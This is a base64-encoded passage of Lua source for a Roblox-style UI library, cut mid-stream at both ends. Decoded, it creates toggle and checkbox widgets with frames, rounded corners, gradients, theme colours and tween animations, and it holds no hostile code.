RvbiIgXTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDEpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzNiwgMzYsIDM3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGNmZy5mYWRpbmdfdG9nZ2xlIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwLjUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAtOSwgMC41LCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMzYsIDAsIDE4KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYig1OCwgNTgsIDYyKQogICAgICAgICAgICAgICAgICAgIH0pOyAgbGlicmFyeTphcHBseV90aGVtZShpdGVtc1sgInRvZ2dsZSIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAidG9nZ2xlX291dGxpbmUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yLCAxLCAtMik7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJNb2RlID0gRW51bS5Cb3JkZXJNb2RlLkluc2V0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYig1MCwgNTAsIDUwKQogICAgICAgICAgICAgICAgICAgIH0pOyAgbGlicmFyeTphcHBseV90aGVtZShpdGVtc1sgInRvZ2dsZV9vdXRsaW5lIiBdLCAiYWNjZW50IiwgIkJhY2tncm91bmRDb2xvcjMiKTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGVfb3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDk5OSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJR3JhZGllbnQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDIxMSwgMjExLCAyMTEpKSwgcmdia2V5KDEsIHJnYigyMTEsIDIxMSwgMjExKSl9OwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRvZ2dsZV9vdXRsaW5lIiBdCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGVfY2lyY2xlIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX291dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMiwgMCwgMik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMTIsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYig4NiwgODYsIDg4KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInRvZ2dsZV9jaXJjbGUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImZhZGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJvdXRsaW5lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC44MDAwMDAwMTE5MjA5Mjk7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDAsIDAsIDApCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZmFkZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgIGVuZDsKCiAgICAgICAgICAgIGlmIGNmZy5mYWRpbmdfdG9nZ2xlIHRoZW4KICAgICAgICAgICAgICAgIGl0ZW1zWyAiYnV0dG9uIiBdLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGNmZy5kZWZhdWx0ID0gbm90IGNmZy5kZWZhdWx0IAogICAgICAgICAgICAgICAgICAgIGNmZy50b2dnbGVfc2VjdGlvbihjZmcuZGVmYXVsdCkgCiAgICAgICAgICAgICAgICBlbmQpCgogICAgICAgICAgICAgICAgZnVuY3Rpb24gY2ZnLnRvZ2dsZV9zZWN0aW9uKGJvb2wpCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRvZ2dsZSIgXSwge0JhY2tncm91bmRDb2xvcjMgPSBib29sIGFuZCB0aGVtZXMucHJlc2V0LmFjY2VudCBvciByZ2IoNTgsIDU4LCA2Mil9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQpCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInRvZ2dsZV9vdXRsaW5lIiBdLCB7QmFja2dyb3VuZENvbG9yMyA9IGJvb2wgYW5kIHRoZW1lcy5wcmVzZXQuYWNjZW50IG9yIHJnYig1MCwgNTAsIDUwKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCkKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAidG9nZ2xlX2NpcmNsZSIgXSwge0JhY2tncm91bmRDb2xvcjMgPSBib29sIGFuZCByZ2IoMjU1LCAyNTUsIDI1NSkgb3IgcmdiKDg2LCA4NiwgODgpLCBQb3NpdGlvbiA9IGJvb2wgYW5kIGRpbTIoMSwgLTE0LCAwLCAyKSBvciBkaW0yKDAsIDIsIDAsIDIpfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJmYWRlIiBdLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IGJvb2wgYW5kIDEgb3IgMC44fSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkKQogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgIAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnRvZ2dsZShvcHRpb25zKSAKICAgICAgICAgICAgbG9jYWwgcmFuZCA9IG1hdGgucmFuZG9tKDEsIDIpIAogICAgICAgICAgICBsb2NhbCBjZmcgPSB7CiAgICAgICAgICAgICAgICBlbmFibGVkID0gb3B0aW9ucy5kZWZhdWx0IG9yIGZhbHNlLAogICAgICAgICAgICAgICAgbmFtZSA9IG9wdGlvbnMubmFtZSBvciAiVG9nZ2xlIiwKICAgICAgICAgICAgICAgIGluZm8gPSBvcHRpb25zLmluZm8gb3IgbmlsLAogICAgICAgICAgICAgICAgZmxhZyA9IG9wdGlvbnMuZmxhZyBvciBsaWJyYXJ5Om5leHRfZmxhZygpLAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB0eXBlID0gb3B0aW9ucy50eXBlIGFuZCBzdHJpbmcubG93ZXIob3B0aW9ucy50eXBlKSBvciByYW5kID09IDEgYW5kICJ0b2dnbGUiIG9yICJjaGVja2JveCI7IC0tICJ0b2dnbGUiLCAiY2hlY2tib3giCgogICAgICAgICAgICAgICAgZGVmYXVsdCA9IG9wdGlvbnMuZGVmYXVsdCBvciBmYWxzZSwKICAgICAgICAgICAgICAgIGZvbGRpbmcgPSBvcHRpb25zLmZvbGRpbmcgb3IgZmFsc2UsIAogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kLAoKICAgICAgICAgICAgICAgIGl0ZW1zID0ge307CiAgICAgICAgICAgICAgICBzZXBlcmF0b3IgPSBvcHRpb25zLnNlcGVyYXRvciBvciBvcHRpb25zLlNlcGVyYXRvciBvciBmYWxzZTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbwogICAgICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE0OwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDI0NSwgMjQ1LCAyNDUpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLm5hbWU7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImluZm8iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRMYWJlbCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFdyYXBwZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDUsIDAsIDE3KTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTEwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBlbmQgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGUiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsOwogICAgICAgICAgICAgICAgICAgIEhvcml6b250YWxBbGlnbm1lbnQgPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuUmlnaHQ7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgOSk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBUb2dnbGUKICAgICAgICAgICAgICAgICAgICBpZiBjZmcudHlwZSA9PSAiY2hlY2tib3giIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSAiIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIExheW91dE9yZGVyID0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAxNiwgMCwgMTYpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDY3LCA2NywgNjgpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidG9nZ2xlX2J1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAib3V0bGluZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0b2dnbGVfYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIsIDEsIC0yKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyTW9kZSA9IEVudW0uQm9yZGVyTW9kZS5JbnNldDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxLCAwLCAxKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDIyLCAyMiwgMjQpCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAib3V0bGluZSIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpdGVtc1sgInRpY2siIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkltYWdlTGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2VUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2UgPSAicmJ4YXNzZXRpZDovLzExMTg2MjY5ODQ2NzU3NSI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAtMSwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAyLCAxLCAyKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgWkluZGV4ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAib3V0bGluZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA0KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlHcmFkaWVudCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmFibGVkID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm91dGxpbmUiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb2xvciA9IHJnYnNlcXtyZ2JrZXkoMCwgcmdiKDIxMSwgMjExLCAyMTEpKSwgcmdia2V5KDEsIHJnYigyMTEsIDIxMSwgMjExKSl9CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOyAgCiAgICAgICAgICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0b2dnbGVfYnV0dG9uIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBMYXlvdXRPcmRlciA9IDI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMSwgMC41KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIC05LCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMzYsIDAsIDE4KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgI